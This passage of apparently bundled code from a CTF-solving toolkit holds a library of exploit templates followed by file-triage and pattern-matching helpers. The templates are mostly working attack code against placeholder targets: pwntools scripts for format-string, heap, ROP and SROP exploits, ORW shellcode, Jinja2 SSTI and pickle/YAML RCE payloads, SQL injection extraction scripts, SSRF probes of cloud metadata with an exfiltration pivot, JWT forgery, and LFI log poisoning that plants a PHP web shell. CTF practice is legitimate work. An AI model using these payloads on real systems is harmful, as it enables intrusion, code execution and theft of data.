      '    """Return True iff padding is valid (or error differs)."""',
      "    raise NotImplementedError",
      "",
      "def split_blocks(data: bytes, bs: int) -> list[bytes]:",
      "    return [data[i:i+bs] for i in range(0, len(data), bs)]",
      "",
      "# TODO: implement bytewise attack for your protocol",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
    id: "ecb-byte-at-a-time",
    title: "ECB byte-at-a-time outline (oracle)",
    body: [
      "```text",
      "1) Confirm ECB: identical blocks => identical ciphertext blocks.",
      "2) Find block size by measuring ciphertext length steps.",
      "3) For each unknown byte: craft prefix so next unknown byte aligns at block end.",
      "4) Build dictionary of 256 candidates; match oracle output block.",
      "5) Stop-loss: if mismatch, re-check padding/encoding/normalization assumptions.",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "format-string-leak",
    title: "Format string leak + write skeleton (%p / %n)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "HOST, PORT = '127.0.0.1', 1337",
      "",
      "def start():",
      "    return remote(HOST, PORT) if args.REMOTE else process(elf.path)",
      "",
      "def leak_stack(io):",
      "    # TODO: adjust menu prompt and count of leaked slots",
      "    io.sendlineafter(b'> ', b'%p|' * 16)",
      "    line = io.recvline(timeout=2) or b''",
      "    leaks = [x for x in line.strip().split(b'|') if x.startswith(b'0x')]",
      "    return leaks",
      "",
      "def fsb_write_payload(where: int, value: int, offset: int) -> bytes:",
      "    # TODO: adapt byte/short/int write strategy for target",
      "    return fmtstr_payload(offset, {where: value}, write_size='short')",
      "",
      "io = start()",
      "leaks = leak_stack(io)",
      "# TODO: parse PIE/libc/canary from leaks and compute target addr",
      "# payload = fsb_write_payload(target_addr, target_value, offset=6)",
      "# io.sendlineafter(b'> ', payload)",
      "io.interactive()",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "heap-tcache-poison",
    title: "Heap tcache poisoning (double-free -> arbitrary write)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "",
      "def alloc(io, idx: int, size: int, data: bytes):",
      "    io.sendlineafter(b'> ', b'1')",
      "    io.sendlineafter(b'idx: ', str(idx).encode())",
      "    io.sendlineafter(b'size: ', str(size).encode())",
      "    io.sendafter(b'data: ', data)",
      "",
      "def free(io, idx: int):",
      "    io.sendlineafter(b'> ', b'2')",
      "    io.sendlineafter(b'idx: ', str(idx).encode())",
      "",
      "def edit(io, idx: int, data: bytes):",
      "    io.sendlineafter(b'> ', b'3')",
      "    io.sendlineafter(b'idx: ', str(idx).encode())",
      "    io.sendafter(b'data: ', data)",
      "",
      "io = process(elf.path)",
      "",
      "# 1) Fill tcache bin and create double-free primitive",
      "alloc(io, 0, 0x60, b'A' * 8)",
      "alloc(io, 1, 0x60, b'B' * 8)",
      "free(io, 0)",
      "free(io, 1)",
      "free(io, 0)  # double free",
      "",
      "# 2) Poison fd pointer to target-0x10 (glibc version dependent)",
      "target = elf.got.get('free', 0)",
      "edit(io, 0, p64(target))",
      "",
      "# 3) Allocate chunks to land controlled pointer at target",
      "alloc(io, 2, 0x60, b'C' * 8)",
      "alloc(io, 3, 0x60, b'D' * 8)",
      "alloc(io, 4, 0x60, p64(elf.symbols.get('win', 0)))",
      "",
      "# TODO: trigger hijacked function pointer/hook",
      "io.interactive()",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "rop-chain-builder",
    title: "ROP chain builder with gadget placeholders",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "rop = ROP(elf)",
      "offset =  cyclic_find(0x6161616c)  # TODO: replace with real crash value",
      "",
      "# TODO: replace with discovered gadgets from ROPgadget/ropper",
      "pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]",
      "ret = rop.find_gadget(['ret'])[0]",
      "",
      "payload = flat(",
      "    b'A' * offset,",
      "    ret,  # stack alignment for libc calls",
      "    pop_rdi,",
      "    next(elf.search(b'/bin/sh\\x00')),  # or libc search after leak",
      "    elf.plt.get('system', 0),",
      ")",
      "",
      "# TODO: send payload through vulnerable input path",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "srop-sigreturn",
    title: "SROP sigreturn frame template (execve/orw)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.arch = 'amd64'",
      "context.binary = elf = ELF('./chall')",
      "",
      "io = process(elf.path)",
      "",
      "syscall_ret = 0x0  # TODO: gadget: syscall; ret",
      "pop_rax = 0x0      # TODO: gadget: pop rax; ret",
      "binsh = 0x0        # TODO: writable addr containing b'/bin/sh\\x00'",
      "",
      "frame = SigreturnFrame()",
      "frame.rax = 59   # execve",
      "frame.rdi = binsh",
      "frame.rsi = 0",
      "frame.rdx = 0",
      "frame.rip = syscall_ret",
      "",
      "payload = flat(",
      "    b'A' * 0x100,  # TODO: overflow offset",
      "    pop_rax,",
      "    15,            # rt_sigreturn syscall number",
      "    syscall_ret,",
      "    bytes(frame),",
      ")",
      "",
      "io.send(payload)",
      "io.interactive()",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "ret2dlresolve",
    title: "ret2dlresolve template (arbitrary resolver call)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "io = process(elf.path)",
      "rop = ROP(elf)",
      "offset = 0x100  # TODO: overflow offset",
      "",
      "dl = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])",
      "bss_addr = elf.bss() + 0x800",
      "",
      "# Stage 1: read fake structures into memory",
      "rop.read(0, bss_addr, len(dl.payload))",
      "rop.ret2dlresolve(dl, bss_addr)",
      "",
      "payload = flat({offset: rop.chain()})",
      "io.send(payload)",
      "io.send(dl.payload)",
      "io.interactive()",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "seccomp-bypass-orw",
    title: "seccomp bypass via ORW shellcode (open/read/write)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.arch = 'amd64'",
      "context.binary = elf = ELF('./chall')",
      "io = process(elf.path)",
      "",
      "flag_path = b'/flag\\x00'",
      "",
      "sc = asm(f'''",
      "    mov rax, 2                /* open */",
      "    lea rdi, [rip+path]",
      "    xor rsi, rsi",
      "    xor rdx, rdx",
      "    syscall",
      "    mov rdi, rax              /* fd */",
      "    mov rax, 0                /* read */",
      "    mov rsi, rsp",
      "    mov rdx, 0x100",
      "    syscall",
      "    mov rdx, rax              /* nbytes */",
      "    mov rax, 1                /* write */",
      "    mov rdi, 1",
      "    mov rsi, rsp",
      "    syscall",
      "    jmp done",
      "path:",
      '    .ascii "/flag\\x00"',
      "done:",
      "''')",
      "",
      "# TODO: use RWX region, mprotect, or stack pivot to run shellcode",
      "io.send(sc)",
      "io.interactive()",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "ssti-jinja2",
    title: "Jinja2 SSTI probe and RCE payload workflow",
    body: [
      "```python",
      "import requests",
      "",
      "URL = 'http://target/render'",
      "PARAM = 'name'",
      "",
      "probes = [",
      "    '{{7*7}}',",
      "    '{{config.items()}}',",
      `    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"`,
      "]",
      "",
      "for p in probes:",
      "    r = requests.get(URL, params={PARAM: p}, timeout=8)",
      "    print('payload=', p)",
      "    print('status=', r.status_code)",
      "    print('body[:200]=', r.text[:200])",
      "    print('-' * 40)",
      "",
      "# TODO: adapt context variable path (config/request/self) to app version",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB3",
    id: "web3-reentrancy-checklist",
    title: "WEB3 reentrancy triage and minimal PoC checklist",
    body: [
      "```text",
      "1) Identify external-call-before-state-update patterns (call/value/send/transfer).",
      "2) Confirm reentry surface (fallback/receive/hook callbacks).",
      "3) Build minimal attacker contract with controlled callback depth.",
      "4) Assert invariants before/after call (balance, totalSupply, debt, shares).",
      "5) Reproduce with fork/local devnet and record deterministic tx trace.",
      "6) Prefer read-only simulation first; escalate only with explicit scope approval.",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB3",
    id: "web3-oracle-manipulation",
    title: "WEB3 oracle manipulation workflow",
    body: [
      "```text",
      "1) Map oracle source path (TWAP/spot/off-chain signer) and update cadence.",
      "2) Measure liquidity depth/slippage around the priced asset pair.",
      "3) Simulate price movement needed to cross protocol threshold.",
      "4) Re-run health checks/liquidation math with manipulated price snapshot.",
      "5) Validate exploitability in forked state with reproducible block context.",
      "6) Record required capital, time window, and mitigation options.",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "sqli-union",
    title: "UNION-based SQLi extraction skeleton",
    body: [
      "```python",
      "import requests",
      "",
      "BASE = 'http://target/products'",
      "PARAM = 'id'",
      "",
      "def send(payload: str):",
      "    return requests.get(BASE, params={PARAM: payload}, timeout=8)",
      "",
      "# 1) Find column count",
      "for i in range(1, 11):",
      '    r = send(f"1 ORDER BY {i}-- -")',
      "    print(i, r.status_code)",
      "",
      "# 2) Identify printable columns",
      'payload = "-1 UNION ALL SELECT 1,2,3,4-- -"  # TODO: adjust column count',
      "r = send(payload)",
      "print(r.text[:300])",
      "",
      "# 3) Extract DB metadata",
      'payload = "-1 UNION ALL SELECT database(),user(),version(),4-- -"',
      "print(send(payload).text[:500])",
      "",
      "# TODO: enumerate tables/columns for target DB flavor",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "sqli-blind-boolean",
    title: "Boolean-based blind SQLi script template",
    body: [
      "```python",
      "import requests",
      "import string",
      "",
      "URL = 'http://target/item'",
      "PARAM = 'id'",
      "TRUE_MARKER = 'Welcome'  # TODO: marker that appears only on true",
      "",
      "def is_true(condition: str) -> bool:",
      `    payload = f"1' AND ({condition})-- -"`,
      "    r = requests.get(URL, params={PARAM: payload}, timeout=8)",
      "    return TRUE_MARKER in r.text",
      "",
      "def extract_value(sql_expr: str, max_len: int = 64) -> str:",
      "    alphabet = string.ascii_letters + string.digits + '_{}-@.:$'",
      "    out = ''",
      "    for pos in range(1, max_len + 1):",
      "        found = False",
      "        for ch in alphabet:",
      `            cond = f"substr(({sql_expr}),{pos},1)='{ch}'"`,
      "            if is_true(cond):",
      "                out += ch",
      "                found = True",
      "                break",
      "        if not found:",
      "            break",
      "    return out",
      "",
      "print(extract_value('select database()'))",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "ssrf-basic",
    title: "Basic SSRF exploitation and bypass checklist",
    body: [
      "```python",
      "import requests",
      "",
      "ENDPOINT = 'http://target/fetch'",
      "PARAM = 'url'",
      "",
      "targets = [",
      "    'http://127.0.0.1:80/',",
      "    'http://localhost/',",
      "    'http://169.254.169.254/latest/meta-data/',",
      "    'http://[::1]/',",
      "    'http://2130706433/',  # 127.0.0.1 as decimal",
      "]",
      "",
      "for t in targets:",
      "    r = requests.get(ENDPOINT, params={PARAM: t}, timeout=8)",
      "    print(t, r.status_code, len(r.text))",
      "",
      "# TODO: try redirects, DNS rebinding, userinfo (@), mixed schemes (gopher/file)",
      "```",
      "",
      "```text",
      "1) Compare response size/status/timing to detect internal access.",
      "2) Probe cloud metadata endpoints and internal admin panels.",
      '3) If URL validation exists, test parser confusion ("http://allowed@127.0.0.1").',
      "4) Pivot to exfiltration: SSRF -> internal token/API key -> privileged action.",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "jwt-forgery",
    title: "JWT forgery (none alg + key confusion) template",
    body: [
      "```python",
      "import base64",
      "import json",
      "import hmac",
      "import hashlib",
      "",
      "def b64u(data: bytes) -> bytes:",
      "    return base64.urlsafe_b64encode(data).rstrip(b'=')",
      "",
      "# Attack 1: alg=none",
      "header_none = b64u(json.dumps({'typ': 'JWT', 'alg': 'none'}).encode())",
      "payload = b64u(json.dumps({'sub': 'admin', 'role': 'admin'}).encode())",
      "token_none = b'.'.join([header_none, payload, b'']).decode()",
      "print('none token:', token_none)",
      "",
      "# Attack 2: HS256 key confusion with exposed RSA public key",
      "public_key = b'-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----\\n'",
      "header_hs = b64u(json.dumps({'typ': 'JWT', 'alg': 'HS256'}).encode())",
      "msg = b'.'.join([header_hs, payload])",
      "sig = hmac.new(public_key, msg, hashlib.sha256).digest()",
      "token_confusion = b'.'.join([header_hs, payload, b64u(sig)]).decode()",
      "print('key-confusion token:', token_confusion)",
      "",
      "# TODO: send token via Authorization: Bearer <token> and verify privilege escalation",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "deserialization-python",
    title: "Python deserialization (pickle/yaml) exploit skeleton",
    body: [
      "```python",
      "import base64",
      "import pickle",
      "import os",
      "",
      "class RCE:",
      "    def __reduce__(self):",
      "        # TODO: replace command with controlled callback/exfil action",
      "        return (os.system, ('id',))",
      "",
      "payload = pickle.dumps(RCE(), protocol=4)",
      "print('pickle_b64=', base64.b64encode(payload).decode())",
      "",
      `yaml_payload = "!!python/object/apply:os.system ['id']"`,
      "print('yaml=', yaml_payload)",
      "",
      "# TODO: deliver payload to vulnerable pickle.loads / yaml.load (unsafe loader)",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "lfi-to-rce",
    title: "LFI -> RCE via log poisoning/filter chains",
    body: [
      "```python",
      "import requests",
      "",
      "BASE = 'http://target/index.php'",
      "LFI_PARAM = 'page'",
      "",
      "# 1) Poison access log with PHP payload",
      `php_payload = '<?php system($_GET["cmd"]); ?>'`,
      "requests.get(BASE, headers={'User-Agent': php_payload}, timeout=8)",
      "",
      "# 2) Include poisoned log file through LFI",
      "log_paths = [",
      "    '/var/log/apache2/access.log',",
      "    '/var/log/nginx/access.log',",
      "]",
      "",
      "for lp in log_paths:",
      "    r = requests.get(BASE, params={LFI_PARAM: lp, 'cmd': 'id'}, timeout=8)",
      "    if 'uid=' in r.text:",
      "        print('RCE via', lp)",
      "        print(r.text[:300])",
      "",
      "# TODO: if wrappers enabled, test php://filter and data:// for alternative chains",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
    id: "rsa-small-e-coppersmith",
    title: "RSA small-e attack with Coppersmith setup",
    body: [
      "```python",
      "# Requires SageMath environment",
      "from sageall import *",
      "",
      "# Given: c = (m)^e mod N, and m has known prefix",
      "N = Integer(0)   # TODO",
      "e = Integer(3)",
      "c = Integer(0)   # TODO",
      "known = b'flag{'",
      "unknown_len = 40  # TODO bytes",
      "",
      "PR.<x> = PolynomialRing(Zmod(N))",
      "m = Integer.from_bytes(known, 'big') * 256**unknown_len + x",
      "f = (m**e - c).monic()",
      "",
      "# beta/epsilon/X depend on bound assumptions",
      "X = 2**(8 * unknown_len)",
      "roots = f.small_roots(X=X, beta=1, epsilon=1/20)",
      "if roots:",
      "    r = int(roots[0])",
      "    rec = int(m(x=r)).to_bytes((int(m(x=r)).bit_length() + 7) // 8, 'big')",
      "    print(rec)",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
    id: "rsa-common-modulus",
    title: "RSA common modulus attack template",
    body: [
      "```python",
      "from math import gcd",
      "",
      "def egcd(a, b):",
      "    if b == 0:",
      "        return (a, 1, 0)",
      "    g, x1, y1 = egcd(b, a % b)",
      "    return (g, y1, x1 - (a // b) * y1)",
      "",
      "def modinv(a, n):",
      "    g, x, _ = egcd(a, n)",
      "    if g != 1:",
      "        raise ValueError('not invertible')",
      "    return x % n",
      "",
      "N = 0      # TODO",
      "e1 = 0     # TODO",
      "e2 = 0     # TODO",
      "c1 = 0     # TODO",
      "c2 = 0     # TODO",
      "",
      "g, a, b = egcd(e1, e2)",
      "if g != 1:",
      "    raise ValueError('exponents must be coprime for basic variant')",
      "",
      "if a < 0:",
      "    c1 = modinv(c1, N)",
      "    a = -a",
      "if b < 0:",
      "    c2 = modinv(c2, N)",
      "    b = -b",
      "",
      "m = (pow(c1, a, N) * pow(c2, b, N)) % N",
      "print(m.to_bytes((m.bit_length() + 7) // 8, 'big'))",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
    id: "aes-cbc-bitflip",
    title: "AES-CBC bit flipping attack template",
    body: [
      "```python",
      "# Goal: modify plaintext block P_i by flipping bytes in C_{i-1}",
      "from binascii import hexlify",
      "",
      "def bitflip(prev_ct: bytes, known_plain: bytes, desired_plain: bytes) -> bytes:",
      "    if not (len(prev_ct) == len(known_plain) == len(desired_plain)):",
      "        raise ValueError('block lengths must match')",
      "    out = bytearray(prev_ct)",
      "    for i in range(len(out)):",
      "        out[i] ^= known_plain[i] ^ desired_plain[i]",
      "    return bytes(out)",
      "",
      "# Example customization",
      "orig_prev = bytes.fromhex('00' * 16)  # TODO intercepted C_{i-1}",
      "known = b'role=user;uid=1' + b'\\x00'",
      "want = b'role=admin;uid=1'",
      "new_prev = bitflip(orig_prev, known, want)",
      "print('new_prev_hex=', hexlify(new_prev).decode())",
      "",
      "# TODO: replace block in ciphertext and submit token/cookie",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
    id: "hash-length-extension",
    title: "Hash length extension attack skeleton",
    body: [
      "```python",
      "# pip install hashpumpy",
      "import hashpumpy",
      "",
      "orig_data = 'user=guest&admin=0'",
      "orig_sig = '0123456789abcdef0123456789abcdef'  # TODO known MAC",
      "append_data = '&admin=1'",
      "",
      "for key_len in range(8, 65):",
      "    new_sig, new_data = hashpumpy.hashpump(orig_sig, orig_data, append_data, key_len)",
      "    # TODO: submit new_data/new_sig to verifier endpoint",
      "    # if accepted: print(key_len, new_sig, repr(new_data)); break",
      "",
      "# Note: applicable to Merkle-Damgard hashes (MD5/SHA1/SHA256 naive prefix-MAC)",
      "```"
    ].join(`
`)
  },
  {
    domain: "REV",
    id: "angr-symbolic-exec",
    title: "angr symbolic execution solve skeleton",
    body: [
      "```python",
      "import angr",
      "import claripy",
      "",
      "BINARY = './chall'",
      "proj = angr.Project(BINARY, auto_load_libs=False)",
      "",
      "arg_len = 32  # TODO",
      "sym_arg = claripy.BVS('sym_arg', arg_len * 8)",
      "state = proj.factory.full_init_state(args=[BINARY, sym_arg])",
      "",
      "# Restrict charset for speed and realistic input",
      "for i in range(arg_len):",
      "    ch = sym_arg.get_byte(i)",
      "    state.solver.add(ch >= 0x20, ch <= 0x7e)",
      "",
      "simgr = proj.factory.simgr(state)",
      "FIND = 0x401234  # TODO success address",
      "AVOID = [0x401111]  # TODO fail addresses",
      "simgr.explore(find=FIND, avoid=AVOID)",
      "",
      "if simgr.found:",
      "    found = simgr.found[0]",
      "    model = found.solver.eval(sym_arg, cast_to=bytes)",
      "    print(model)",
      "```"
    ].join(`
`)
  },
  {
    domain: "REV",
    id: "z3-constraint-solver",
    title: "z3 constraint solver template",
    body: [
      "```python",
      "from z3 import *",
      "",
      "s = Solver()",
      "chars = [BitVec(f'c{i}', 8) for i in range(32)]  # TODO length",
      "",
      "for c in chars:",
      "    s.add(c >= 0x20, c <= 0x7e)",
      "",
      "# TODO: translate checks from disassembly/decompiler",
      "# Example constraints:",
      "s.add(chars[0] == ord('f'))",
      "s.add(chars[1] == ord('l'))",
      "s.add(chars[2] == ord('a'))",
      "s.add(chars[3] == ord('g'))",
      "s.add(Sum([ZeroExt(24, c) for c in chars[:8]]) == 700)",
      "",
      "if s.check() == sat:",
      "    m = s.model()",
      "    out = bytes([m[c].as_long() for c in chars])",
      "    print(out)",
      "else:",
      "    print('unsat')",
      "```"
    ].join(`
`)
  },
  {
    domain: "REV",
    id: "frida-hook-skeleton",
    title: "Frida hook skeleton for runtime inspection",
    body: [
      "```javascript",
      "// Run: frida -f ./chall -l hook.js --no-pause",
      "",
      "const target = Module.findExportByName(null, 'strcmp');",
      "if (target) {",
      "  Interceptor.attach(target, {",
      "    onEnter(args) {",
      "      this.a0 = Memory.readUtf8String(args[0]);",
      "      this.a1 = Memory.readUtf8String(args[1]);",
      "      send({ event: 'strcmp_enter', a0: this.a0, a1: this.a1 });",
      "    },",
      "    onLeave(retval) {",
      "      send({ event: 'strcmp_leave', ret: retval.toInt32() });",
      "    },",
      "  });",
      "}",
      "",
      "// TODO: hook custom function by address (Module.base.add(offset))",
      "```",
      "",
      "```python",
      "# Optional host script to collect Frida messages",
      "import frida, sys",
      "",
      "def on_message(msg, data):",
      "    print(msg)",
      "",
      "session = frida.spawn(['./chall'])",
      "sess = frida.attach(session)",
      "with open('hook.js', 'r', encoding='utf-8') as f:",
      "    script = sess.create_script(f.read())",
      "script.on('message', on_message)",
      "script.load()",
      "frida.resume(session)",
      "sys.stdin.read()",
      "```"
    ].join(`
`)
  },
  {
    domain: "FORENSICS",
    id: "volatility3-workflow",
    title: "Volatility 3 memory forensics workflow",
    body: [
      "```text",
      "1) Identify image info/profile hints:",
      "   python3 vol.py -f memdump.raw windows.info",
      "",
      "2) Enumerate processes and suspicious parent-child chains:",
      "   python3 vol.py -f memdump.raw windows.pslist",
      "   python3 vol.py -f memdump.raw windows.pstree",
      "",
      "3) Inspect command lines and loaded modules:",
      "   python3 vol.py -f memdump.raw windows.cmdline",
      "   python3 vol.py -f memdump.raw windows.dlllist --pid <PID>",
      "",
      "4) Network and handles triage:",
      "   python3 vol.py -f memdump.raw windows.netscan",
      "   python3 vol.py -f memdump.raw windows.handles --pid <PID>",
      "",
      "5) Extract memory artifacts:",
      "   python3 vol.py -f memdump.raw windows.memdump --pid <PID> --dump-dir dumps/",
      "   python3 vol.py -f memdump.raw windows.filescan",
      "",
      "6) Hunt credentials/flags with strings + yara on dumps directory.",
      "```"
    ].join(`
`)
  },
  {
    domain: "FORENSICS",
    id: "steganography-pipeline",
    title: "Steganography analysis pipeline (LSB/zsteg/steghide)",
    body: [
      "```text",
      "1) File triage:",
      "   file sample.png",
      "   exiftool sample.png",
      "   binwalk -e sample.png",
      "",
      "2) Metadata and raw strings:",
      "   strings -n 6 sample.png | tee strings.txt",
      "   xxd sample.png | head",
      "",
      "3) PNG/BMP LSB extraction:",
      "   zsteg -a sample.png",
      "   zsteg sample.png -E b1,r,lsb > lsb_r_b1.bin",
      "",
      "4) Steghide attempt (jpeg/wav commonly):",
      "   steghide info sample.jpg",
      "   steghide extract -sf sample.jpg -p '<password>'",
      "",
      "5) Visual channel splitting:",
      "   python3 -m PIL sample.png  # TODO: write script to split RGB/alpha and inspect",
      "",
      "6) If archive recovered, validate with file/unzip/7z and recurse.",
      "```"
    ].join(`
`)
  },
  {
    domain: "MISC",
    id: "misc-osint-evidence-loop",
    title: "MISC/OSINT evidence-first workflow",
    body: [
      "```text",
      "1) Define hypothesis and required disconfirm evidence before collecting sources.",
      "2) Collect at least 2 independent citations per critical claim.",
      "3) Track source timestamps and archive links for reproducibility.",
      "4) Separate confirmed facts vs assumptions in notes/worklog.",
      "5) Run one cheapest disconfirm test before escalating complexity.",
      "6) Only mark solved when final claim is backed by direct evidence artifact.",
      "```"
    ].join(`
`)
  }
];
function listExploitTemplates(domain3) {
  return TEMPLATES.filter((t) => domain3 ? t.domain === domain3 : true).map(({ body: _body, ...rest }) => rest);
}
function getExploitTemplate(domain3, id) {
  const normalizedId = id.trim();
  if (!normalizedId) {
    return null;
  }
  return TEMPLATES.find((t) => t.domain === domain3 && t.id === normalizedId) ?? null;
}

// src/orchestration/auto-triage.ts
var EXTENSION_HINTS = [
  { extensions: [".elf", ".so", ".o", ".out", ".bin"], detectedType: "elf" },
  { extensions: [".zip", ".tar", ".tgz", ".gz", ".bz2", ".xz", ".7z", ".rar"], detectedType: "archive" },
  { extensions: [".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp", ".tif", ".tiff"], detectedType: "image" },
  { extensions: [".pcap", ".pcapng", ".cap"], detectedType: "pcap" },
  { extensions: [".pdf"], detectedType: "pdf" },
  { extensions: [".html", ".htm", ".json", ".xml", ".yaml", ".yml"], detectedType: "web" },
  {
    extensions: [".sh", ".py", ".rb", ".pl", ".php", ".js", ".ts", ".lua", ".ps1"],
    detectedType: "script"
  }
];
var FILE_OUTPUT_HINTS = [
  { pattern: /\belf\b/i, detectedType: "elf" },
  {
    pattern: /\b(zip archive|tar archive|gzip compressed|bzip2 compressed|xz compressed|7-zip|rar archive)\b/i,
    detectedType: "archive"
  },
  {
    pattern: /\b(png image|jpeg image|gif image|bitmap|tiff image|webp image|svg image)\b/i,
    detectedType: "image"
  },
  { pattern: /\b(pcap|capture file)\b/i, detectedType: "pcap" },
  { pattern: /\bpdf document\b/i, detectedType: "pdf" },
  {
    pattern: /\b(shell script|python script|perl script|ruby script|php script|javascript source|typescript source)\b/i,
    detectedType: "script"
  },
  { pattern: /\b(html document|json data|xml document)\b/i, detectedType: "web" }
];
function shellQuote(value) {
  return `'${value.replace(/'/g, `'"'"'`)}'`;
}
function normalizedExtension(filePath) {
  const lower = filePath.trim().toLowerCase();
  if (lower.endsWith(".tar.gz") || lower.endsWith(".tgz")) {
    return ".tgz";
  }
  const dot = lower.lastIndexOf(".");
  return dot >= 0 ? lower.slice(dot) : "";
}
function detectFileType(filePath, fileOutput) {
  const output = fileOutput ?? "";
  for (const hint of FILE_OUTPUT_HINTS) {
    if (hint.pattern.test(output)) {
      return hint.detectedType;
    }
  }
  const ext = normalizedExtension(filePath);
  for (const hint of EXTENSION_HINTS) {
    if (hint.extensions.includes(ext)) {
      return hint.detectedType;
    }
  }
  if (/^https?:\/\//i.test(filePath.trim())) {
    return "web";
  }
  return "unknown";
}
function suggestTarget(detectedType) {
  switch (detectedType) {
    case "elf":
      return "PWN";
    case "web":
      return "WEB_API";
    case "archive":
    case "image":
    case "pcap":
    case "pdf":
      return "FORENSICS";
    case "script":
      return "MISC";
    default:
      return "UNKNOWN";
  }
}
function generateTriageCommands(filePath, detectedType) {
  const quoted = shellQuote(filePath);
  const ext = normalizedExtension(filePath);
  if (detectedType === "elf") {
    return [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm binary format", phase: 1 },
      {
        tool: "checksec",
        command: `checksec --file=${quoted}`,
        purpose: "Inspect binary mitigations",
        phase: 1
      },
      { tool: "readelf", command: `readelf -h ${quoted}`, purpose: "Inspect ELF headers", phase: 1 },
      {
        tool: "strings",
        command: `strings ${quoted} | grep -iE "flag|CTF" | head -20`,
        purpose: "Find CTF indicators quickly",
        phase: 1
      },
      { tool: "ldd", command: `ldd ${quoted}`, purpose: "Inspect linked libraries", phase: 2 }
    ];
  }
  if (detectedType === "archive") {
    const commands = [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm archive container", phase: 1 },
      { tool: "binwalk", command: `binwalk ${quoted}`, purpose: "Detect embedded content", phase: 1 },
      { tool: "7z", command: `7z l ${quoted}`, purpose: "List archive entries", phase: 1 }
    ];
    if (ext === ".zip") {
      commands.push({ tool: "unzip", command: `unzip -l ${quoted}`, purpose: "List ZIP members", phase: 1 });
    } else {
      commands.push({ tool: "tar", command: `tar -tf ${quoted}`, purpose: "List TAR-like members", phase: 1 });
    }
    return commands;
  }
  if (detectedType === "image") {
    const commands = [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm image encoding", phase: 1 },
      { tool: "exiftool", command: `exiftool ${quoted}`, purpose: "Extract metadata", phase: 1 },
      { tool: "binwalk", command: `binwalk ${quoted}`, purpose: "Scan for embedded files", phase: 1 },
      { tool: "strings", command: `strings ${quoted} | head -20`, purpose: "Preview readable strings", phase: 1 }
    ];
    if (ext === ".png") {
      commands.push({ tool: "zsteg", command: `zsteg ${quoted}`, purpose: "Probe PNG steganography", phase: 2 });
    }
    return commands;
  }
  if (detectedType === "pcap") {
    return [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm capture file format", phase: 1 },
      {
        tool: "tshark",
        command: `tshark -r ${quoted} -q -z io,phs`,
        purpose: "Protocol hierarchy summary",
        phase: 1
      },
      {
        tool: "tshark",
        command: `tshark -r ${quoted} -T fields -e frame.protocols | sort -u`,
        purpose: "List unique protocol stacks",
        phase: 1
      }
    ];
  }
  if (detectedType === "pdf") {
    return [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm PDF document", phase: 1 },
      { tool: "exiftool", command: `exiftool ${quoted}`, purpose: "Extract metadata", phase: 1 },
      {
        tool: "strings",
        command: `strings ${quoted} | grep -i flag | head -10`,
        purpose: "Find likely flag strings",
        phase: 1
      }
    ];
  }
  if (detectedType === "script" || detectedType === "web") {
    return [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm text/script type", phase: 1 },
      { tool: "head", command: `head -50 ${quoted}`, purpose: "Inspect top-of-file logic", phase: 1 },
      { tool: "wc", command: `wc -l ${quoted}`, purpose: "Estimate content size", phase: 1 }
    ];
  }
  return [
    { tool: "file", command: `file ${quoted}`, purpose: "Baseline type identification", phase: 1 },
    { tool: "xxd", command: `xxd ${quoted} | head -5`, purpose: "Inspect leading bytes", phase: 1 },
    { tool: "strings", command: `strings ${quoted} | head -20`, purpose: "Preview readable strings", phase: 1 }
  ];
}
function triageFile(filePath, fileOutput) {
  const detectedType = detectFileType(filePath, fileOutput);
  const suggestedTarget = suggestTarget(detectedType);
  const commands = generateTriageCommands(filePath, detectedType);
  const immediateCount = commands.filter((command) => command.phase === 1).length;
  const conditionalCount = commands.length - immediateCount;
  const summary = [
    `File: ${filePath}`,
    `Detected type: ${detectedType}`,
    `Suggested target: ${suggestedTarget}`,
    `Commands: ${immediateCount} immediate${conditionalCount > 0 ? `, ${conditionalCount} conditional` : ""}`
  ].join(`
`);
  return {
    filePath,
    detectedType,
    suggestedTarget,
    commands,
    summary
  };
}

// src/orchestration/pattern-matcher.ts
var KNOWN_PATTERNS = [
  {
    patternId: "buffer-overflow-basic",
    patternName: "Basic Stack Buffer Overflow",
    confidence: "high",
    targetType: "PWN",
    description: "Fixed-size stack buffer with controllable overwrite and likely RIP/EIP control.",
